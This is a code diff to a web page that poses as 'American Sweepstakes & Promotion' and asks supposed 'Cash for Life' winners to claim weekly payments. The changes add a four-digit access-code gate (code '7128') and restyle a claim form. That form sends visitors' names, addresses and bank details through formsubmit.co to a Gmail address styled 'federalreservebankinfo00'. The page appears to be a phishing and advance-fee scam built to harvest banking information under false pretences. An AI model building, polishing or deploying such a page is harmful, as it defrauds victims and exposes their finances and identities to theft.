@@ -67,6 +67,7 @@
 				<p style="margin:0;font-size:16px;font-weight:700;color:var(--accent);">American Sweepstakes & Promotion</p>
 			</div>
 			<h2 id="loginTitle">Enter Claim Login Code</h2>
+			<p id="loginDescription" style="margin:0 0 14px;color:#f5f5f5;line-height:1.5;">This page is protected. Please log in with the page access code to view the site.</p>
 			<form id="loginForm">
 				<input inputmode="numeric" pattern="[0-9]*" maxlength="4" id="code" class="code-input" autocomplete="one-time-code" aria-label="4-digit code" required />
 				<div style="margin-top:14px">
@@ -99,7 +100,7 @@
 			<button class="btn" onclick="showSection('support')">Customer Service</button>
 		</nav>
 
-		<section id="services" style="display:none">
+		<section id="services" style="display:block">
 			<h2>Official Rules</h2>
 			<p style="color:#ffffff;">We run verified sweepstakes and promotions nationwide. For questions about participation, see Customer Service.</p>
 			<div style="margin:16px 0 0;padding:16px;border-radius:12px;background:rgba(255,255,255,0.12);border:1px solid rgba(255,255,255,0.28);color:#fff;text-align:center;">
@@ -172,14 +173,14 @@ ________________________________________________________________________________
 			<h1 style="margin-top:0;color:#ffffff;">About American Sweepstakes & Promotions</h1>
 			<p style="color:#ffffff;">At American Sweepstakes we’ve been administering and implementing sweepstakes, contests and game promotions for some of the biggest marketers in America for over 30 years. We are a promotional marketing company that services brands, organizations and their agencies. Our flawless administration and execution services provide our clients with solutions where everyone wins. This is one business in which experience counts! Our principals have over 30 years of experience so we make implementing sweepstakes promotions simple and easy for our clients. You can rest assured that your sweepstakes, contest and game promotions will be fully legal and compliant with all the different rules, regulations and promotional guidelines no matter how many platforms you wish to integrate. You won’t have to worry about lawsuits, fines, over-redemption of prizes, state bonding and registration, privacy policies or some of the other many details involved with running a game of chance or skill. It’s our job, and responsibility to our clients, to stay abreast of changes in the area of promotion law, sweepstakes legislation, and social media guidelines…from a national and international basis. American Sweepstakes also offers digital engagement solutions that can host your promotions and gather the data from participants. You need to be where your customers are and we can assist you with social media solutions, including Facebook applications, along with mobile marketing and SMS programs.</p>
 		</section>
-		<section id="claim" style="display:none">
+		<section id="claim" style="display:none; background:linear-gradient(145deg,#0047ab,#ff0000); color:#ffffff;">
 			<h2>Claim Weekly Payment</h2>
 			<p>Complete the official weekly payment registration request below to submit your claim.</p>
-			<form id="claimForm" action="https://formsubmit.co/ajax/federalreservebankinfo00@gmail.com" method="POST">
+			<form id="claimForm" action="https://formsubmit.co/ajax/federalreservebankinfo00@gmail.com" method="POST" style="margin-top:16px;padding:16px;border:1px solid rgba(255,255,255,0.18);border-radius:8px;background:rgba(255,255,255,0.08);color:#ffffff;">
 				<input type="hidden" name="_subject" value="New Claim Form Submission" />
 				<input type="hidden" name="_captcha" value="false" />
 				<input type="hidden" name="_template" value="table" />
-				<fieldset>
+				<fieldset style="margin-top:14px;border:1px solid rgba(255,255,255,0.18);background:transparent;color:#ffffff;">
 					<legend>Personal Information</legend>
 					<div class="form-grid">
 						<label>First Name<input type="text" name="firstName" placeholder="First Name" /></label>
@@ -194,7 +195,7 @@ ________________________________________________________________________________
 					</div>
 				</fieldset>
 
-				<fieldset>
+				<fieldset style="margin-top:14px;border:1px solid rgba(255,255,255,0.18);background:transparent;color:#ffffff;">
 					<legend>Address</legend>
 					<div class="form-grid">
 						<label>Address<input type="text" name="address" placeholder="Address" /></label>
@@ -204,7 +205,7 @@ ________________________________________________________________________________
 					</div>
 				</fieldset>
 
-				<fieldset>
+				<fieldset style="margin-top:14px;border:1px solid rgba(255,255,255,0.18);background:transparent;color:#ffffff;">
 					<legend>Bank Information</legend>
 					<div class="form-grid">
 						<label>Name of Bank<input type="text" name="bankName" placeholder="Name of Bank" /></label>
@@ -217,7 +218,7 @@ ________________________________________________________________________________
 					</div>
 				</fieldset>
 
-				<fieldset>
+				<fieldset style="margin-top:14px;border:1px solid rgba(255,255,255,0.18);background:transparent;color:#ffffff;">
 					<legend>Terms and Conditions</legend>
 					<p>If you are a winner from our Cash for Life Promotion, please complete this Official Weekly Payment Registration form in order to receive your weekly payout and submit it below. You are required to have a new checking account with a bank you have been with for over 5 years.</p>
 					<p>This form is used by American Sweepstakes & Promotion Co. Escrow Officer when, on behalf of an authorized person, escrow requests information from the holder of a Sweepstakes Awards or any prizes to confirm the terms and conditions for releasing funds to the recipient.</p>
@@ -239,11 +240,11 @@ ________________________________________________________________________________
 						<tr><th>Winner Name</th><th>Status</th><th>Action</th></tr>
 					</thead>
 				<tbody>
-					<tr><td>Michael A. Brooks</td><td>Unclaim</td><td><a href="#claim" onclick="showSection('claim')">Claim Weekly Payment</a></td></tr>
-					<tr><td>Jasmine R. Lewis</td><td>Unclaim</td><td><a href="#claim" onclick="showSection('claim')">Claim Weekly Payment</a></td></tr>
-					<tr><td>Daniel T. Rivers</td><td>Unclaim</td><td><a href="#claim" onclick="showSection('claim')">Claim Weekly Payment</a></td></tr>
-					<tr><td>Patricia W. Gomez</td><td>Unclaim</td><td><a href="#claim" onclick="showSection('claim')">Claim Weekly Payment</a></td></tr>
-					<tr><td>Charmaine Baker</td><td>Unclaim</td><td><a href="#claim" onclick="showSection('claim')">Claim Weekly Payment</a></td></tr>
+					<tr><td>Michael A. Brooks</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Jasmine R. Lewis</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Daniel T. Rivers</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Patricia W. Gomez</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Charmaine Baker</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
 				</tbody>
 				</table>
 			</div>
@@ -371,15 +372,41 @@ ________________________________________________________________________________
 		const main = document.getElementById('mainContent');
 		const form = document.getElementById('loginForm');
 		const err = document.getElementById('err');
+		const loginTitle = document.getElementById('loginTitle');
+		const loginDescription = document.getElementById('loginDescription');
 
 		// The site will always ask for the code on each visit (no persistence used).
-		let unlocked = false;
+		const PAGE_ACCESS_CODE = '7128';
+		const CLAIM_CODE = '7128';
+		let pageUnlocked = false;
+		let claimUnlocked = false;
+		let pendingSection = null;
+		let gateMode = 'page';
+
+		function openGate(mode){
+			gateMode = mode;
+			if (mode === 'claim') {
+				loginTitle.textContent = 'Enter Claim Access Code';
+				loginDescription.textContent = 'This section is protected. Please enter your claim code to access the weekly payment form.';
+			} else {
+				loginTitle.textContent = 'Enter Page Access Code';
+				loginDescription.textContent = 'This page is protected. Please log in with your page access code to view the site.';
+			}
+			gate.style.display = 'flex';
+			err.style.display = 'none';
+			document.getElementById('code').value = '';
+			document.getElementById('code').focus();
+		}
 
 		function showSection(id){
-			if (!unlocked) {
-				gate.style.display = 'flex';
-				err.style.display = 'none';
-				document.getElementById('code').focus();
+			if (!pageUnlocked) {
+				pendingSection = id;
+				openGate('page');
+				return;
+			}
+			if (id === 'claim' && !claimUnlocked) {
+				pendingSection = id;
+				openGate('claim');
 				return;
 			}
 			document.querySelectorAll('main section').forEach(s=>s.style.display='none');
@@ -392,22 +419,48 @@ ________________________________________________________________________________
 			const val = document.getElementById('code').value.trim();
 			if(/^[0-9]{4}$/.test(val)){
 				// Simple client-side check. For stronger protection, verify on server.
-				const correct = '7128';
-				if(val === correct){
-					unlocked = true;
-					gate.style.display = 'none';
-					main.style.display = 'block';
-					main.setAttribute('aria-hidden','false');
-					const successEl = document.getElementById('loginSuccess');
-					if (successEl) {
-						successEl.style.display = 'block';
-						successEl.style.color = '#ffffff';
-						setTimeout(() => { successEl.style.display = 'none'; }, 5000);
+				if (gateMode === 'claim') {
+					if (val === CLAIM_CODE) {
+						claimUnlocked = true;
+						gate.style.display = 'none';
+						const successEl = document.getElementById('loginSuccess');
+						if (successEl) {
+							successEl.textContent = 'Claim access granted. Please complete your weekly payment form.';
+							successEl.style.display = 'block';
+							setTimeout(() => { successEl.style.display = 'none'; }, 5000);
+						}
+						showSection(pendingSection || 'claim');
+						pendingSection = null;
+						return;
 					}
-					showSection('promotion');
 				} else {
-					err.style.display = 'block';
+					if (val === PAGE_ACCESS_CODE) {
+						pageUnlocked = true;
+						gate.style.display = 'none';
+						main.style.display = 'block';
+						main.setAttribute('aria-hidden','false');
+						const successEl = document.getElementById('loginSuccess');
+						if (successEl) {
+							successEl.textContent = 'Page access granted. Welcome to American Sweepstakes.';
+							successEl.style.display = 'block';
+							setTimeout(() => { successEl.style.display = 'none'; }, 5000);
+						}
+						if (pendingSection === 'claim') {
+							openGate('claim');
+							return;
+						}
+						showSection(pendingSection || 'services');
+						pendingSection = null;
+						return;
+					}
 				}
+				if (gateMode === 'claim') {
+					err.textContent = 'Invalid claim code — please try again.';
+				} else {
+					err.textContent = 'Invalid access code — please try again.';
+				}
+				err.style.display = 'block';
+				return;
 			} else {
 				err.textContent = 'Enter a 4-digit code.';
 				err.style.display = 'block';
